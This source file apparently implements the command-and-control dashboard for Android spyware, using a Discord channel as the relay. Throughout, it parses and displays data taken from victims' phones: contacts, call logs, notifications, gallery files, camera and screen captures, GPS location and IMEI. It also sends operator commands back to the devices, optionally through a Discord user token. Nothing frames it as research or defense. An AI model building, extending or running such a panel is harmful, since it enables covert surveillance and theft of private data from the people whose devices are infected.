import express from 'express';
import { createServer as createViteServer } from 'vite';
import { createServer } from 'http';
import { Server } from 'socket.io';
import { Client, GatewayIntentBits, Partials } from 'discord.js';
import path from 'path';

const DISCORD_TOKEN = process.env.DISCORD_TOKEN || "";
const CHANNEL_ID = process.env.CHANNEL_ID || "";
const WEBHOOK_URL = process.env.WEBHOOK_URL || "";
const USER_TOKEN = process.env.USER_TOKEN || "";

async function startServer() {
  const app = express();
  const httpServer = createServer(app);
  const io = new Server(httpServer, { cors: { origin: '*' } });
  const PORT = process.env.PORT || 3000;

  let userFetched = false;

  const client = new Client({
    intents: [
      GatewayIntentBits.Guilds,
      GatewayIntentBits.GuildMessages,
      GatewayIntentBits.MessageContent,
      GatewayIntentBits.GuildMembers,
      GatewayIntentBits.GuildPresences,
    ],
    partials: [Partials.Channel, Partials.Message]
  });

  client.on('ready', async () => {
    console.log(`Discord bot logged in as ${client.user?.tag}`);
    io.emit('status', { text: `CONNECTED: ${client.user?.tag}`, color: '#4ade80' });
    
    try {
      const botUser = await client.users.fetch(client.user!.id, { force: true });
      io.emit('profile', {
        type: 'bot',
        info: `USERNAME: ${botUser.username}\nDISCRIM: #${botUser.discriminator}\nID: ${botUser.id}\nSTATUS: ONLINE`,
        avatar: botUser.displayAvatarURL({ size: 256 }),
        banner: botUser.bannerURL({ size: 512 })
      });
    } catch (e) { console.error(e); }
  });

  const processMessageText = (rawText: string) => {
    let text = rawText.replace(/\x1B(?:[@-Z\\-_]|\[[0-?]*[ -/]*[@-~])/g, '').trim();
    if (!text) return;

    let isDeviceList = false;
    const devMatches = [...text.matchAll(/(?:Device|📱).*?`([^`]+)`.*?(?:ID|🆔).*?`([^`]+)`.*?(?:Last Seen|🕒).*?`([^`]+)`/gis)];
    if (devMatches.length > 0) {
      isDeviceList = true;
      for (const match of devMatches) {
        io.emit('device', { name: match[1], id: match[2], lastSeen: match[3] });
      }
    }

    const sysInfoTriggers = ["[TELEPHONY INFO]", "[OS INFO]", "[BATTERY INFO]", "[STORAGE INFO]", "[NETWORK INFO]", "[DISPLAY INFO]", "--- DETAILED DEVICE INFO ---", "----------------------------", "Manufacturer:", "Brand:", "Device:", "Product:", "Hardware:", "Board:", "Bootloader:", "Radio Version:", "Android ID:", "Operator:", "Sim State:", "IMEI:", "Android Version:", "SDK API Level:", "Security Patch:", "Build ID:", "Kernel Version:", "Level:", "Charging:", "Technology:", "Temperature:", "Voltage:", "Internal Total:", "Internal Free:", "IP Address:", "MAC Address:", "Resolution:", "Density DPI:", "Model:"];
    if (!isDeviceList && sysInfoTriggers.some(t => text.includes(t))) {
      io.emit('sys_info', text);
      return; // Don't emit to general logs if it's sys info
    }

    io.emit('log', text);

    if (text.includes('CALL_LOG_DATA:')) {
      const clMatches = [...text.matchAll(/Name: (.*?), Num: (.*?), Type: (.*?), Date: (.*?), Time: (.*?), Dur: (.*)/g)];
      for (const match of clMatches) io.emit('call_log', match.slice(1, 7));
    }

    if (text.includes('CONTACT_DATA:')) {
      const coMatches = [...text.matchAll(/Name: (.*?), Phone: (.*)/g)];
      for (const match of coMatches) io.emit('contact', match.slice(1, 3));
    }

    const galMatches = [...text.matchAll(/GALLERY_DATA: \[(.*?)\] \[(.*?)\] (.*)/g)];
    for (const match of galMatches) io.emit('gallery', { category: match[1], bucket: match[2], path: match[3] });

    const notifMatches = [...text.matchAll(/^\[(.*?)\] \[(.*?)\] (.*?): (.*)$/gm)];
    for (const match of notifMatches) {
      if (!match[0].includes('GALLERY_DATA') && !match[0].includes('CALL_LOG_DATA') && !match[0].includes('CONTACT_DATA')) {
        io.emit('notif', match.slice(1, 5));
      }
    }

    if (text.startsWith('Lat: ') && text.includes(', Lon: ')) {
      const parts = text.split(', Lon: ');
      const lat = parseFloat(parts[0].replace('Lat: ', '').trim());
      const lon = parseFloat(parts[1].trim());
      io.emit('location', { lat, lon });
    }
    if (text.startsWith('City: ')) io.emit('location_meta', { city: text.substring(6).trim() });
    if (text.startsWith('Area: ')) io.emit('location_meta', { area: text.substring(6).trim() });
    if (text.startsWith('Maps: ')) io.emit('location_meta', { mapsUrl: text.substring(6).trim() });
  };

  client.on('messageCreate', async (message) => {
    if (message.channelId !== CHANNEL_ID) return;
    
    io.emit('client_detected', message.author.username);
    
    if (!userFetched && !message.author.bot) {
      try {
        const user = await client.users.fetch(message.author.id, { force: true });
        io.emit('profile', {
          type: 'user',
          info: `USERNAME: ${user.username}\nID: ${user.id}\nCREATED: ${user.createdAt.toISOString().split('T')[0]}`,
          avatar: user.displayAvatarURL({ size: 256 }),
          banner: user.bannerURL({ size: 512 })
        });
        userFetched = true;
      } catch (e) { console.error(e); }
    }

    if (message.content) {
      processMessageText(message.content);
    }

    for (const [_, attachment] of message.attachments) {
      const filename = attachment.name.toLowerCase();
      if (filename.match(/\.(jpg|jpeg|png|bmp)$/)) {
        const imgType = filename.includes('screen') ? 'screen' : 'cam';
        io.emit('image', { url: attachment.url, type: imgType });
      } else if (filename.match(/\.(txt|log|json|xml)$/)) {
        try {
          const response = await fetch(attachment.url);
          const textData = await response.text();
          io.emit('log', `[FILE START] Processing ${filename}...`);
          textData.split('\n').forEach(line => {
            if (line.trim()) processMessageText(line);
          });
          io.emit('log', `[FILE END] ${filename} processed.`);
        } catch (e) {
          io.emit('log', `Text Parse Error: ${e}`);
        }
      } else {
        io.emit('log', `Received file: ${filename}`);
      }
    }
  });

  client.login(DISCORD_TOKEN).catch(err => {
    console.error("Discord login failed:", err);
    io.emit('status', { text: `LOGIN FAILED`, color: '#ff3333' });
    io.emit('log', `Discord Error: ${err}`);
  });

  io.on('connection', (socket) => {
    if (client.isReady()) {
      socket.emit('status', { text: `CONNECTED: ${client.user?.tag}`, color: '#4ade80' });
    } else {
      socket.emit('status', { text: `CONNECTING...`, color: '#ff3333' });
    }

    socket.on('command', async (cmd) => {
      try {
        if (USER_TOKEN) {
          const res = await fetch(`https://discord.com/api/v9/channels/${CHANNEL_ID}/messages`, {
            method: 'POST',
            headers: {
              'authorization': USER_TOKEN,
              'content-type': 'application/json'
            },
            body: JSON.stringify({ content: cmd })
          });
          if (!res.ok) socket.emit('log', `[!] User Send Error: ${res.status}`);
        } else if (WEBHOOK_URL) {
          await fetch(WEBHOOK_URL, {
            method: 'POST',
            headers: { 'content-type': 'application/json' },
            body: JSON.stringify({
              content: cmd,
              username: "NeoDronzer Terminal",
              avatar_url: "https://i.imgur.com/4M34hi2.png"
            })
          });
        }
        socket.emit('log', `> Sending: ${cmd}`);
      } catch (err) {
        socket.emit('log', `[!] Send Error: ${err}`);
      }
    });
  });

  app.use(express.json({ limit: '50mb' }));

  app.post('/api/3d/generate', async (req, res) => {
    try {
      if (!process.env.MESHY_API_KEY) {
        return res.status(500).json({ error: 'MESHY_API_KEY not configured. Get a free key at https://www.meshy.ai/' });
      }
      
      const { imageBase64 } = req.body;
      if (!imageBase64) return res.status(400).json({ error: 'No image provided' });
      
      const taskRes = await fetch('https://api.meshy.ai/v1/image-to-3d', {
        method: 'POST',
        headers: {
          'Authorization': `Bearer ${process.env.MESHY_API_KEY}`,
          'Content-Type': 'application/json'
        },
        body: JSON.stringify({
          image_url: imageBase64,
          enable_pbr: true
        })
      });
      
      const taskData = await taskRes.json();
      if (!taskRes.ok) {
        return res.status(taskRes.status).json({ error: taskData.message || 'Failed to start task' });
      }
      
      res.json({ taskId: taskData.result });
    } catch (err) {
      res.status(500).json({ error: String(err) });
    }
  });

  app.get('/api/3d/task/:taskId', async (req, res) => {
    try {
      if (!process.env.MESHY_API_KEY) {
        return res.status(500).json({ error: 'MESHY_API_KEY not configured' });
      }
      
      const taskRes = await fetch(`https://api.meshy.ai/v1/image-to-3d/${req.params.taskId}`, {
        headers: { 'Authorization': `Bearer ${process.env.MESHY_API_KEY}` }
      });
      
      const taskData = await taskRes.json();
      if (!taskRes.ok) {
        return res.status(taskRes.status).json({ error: taskData.message || 'Failed to check task' });
      }
      
      res.json(taskData);
    } catch (err) {
      res.status(500).json({ error: String(err) });
    }
  });

  app.get('/api/health', (req, res) => {
    res.json({ status: 'ok' });
  });

  if (process.env.NODE_ENV !== 'production') {
    const vite = await createViteServer({
      server: { middlewareMode: true },
      appType: 'spa',
    });
    app.use(vite.middlewares);
  } else {
    const distPath = path.join(process.cwd(), 'dist');
    app.use(express.static(distPath));
    app.get('*', (req, res) => {
      res.sendFile(path.join(distPath, 'index.html'));
    });
  }

  httpServer.listen(PORT, '0.0.0.0', () => {
    console.log(`Server running on http://localhost:${PORT}`);
  });
}

startServer();
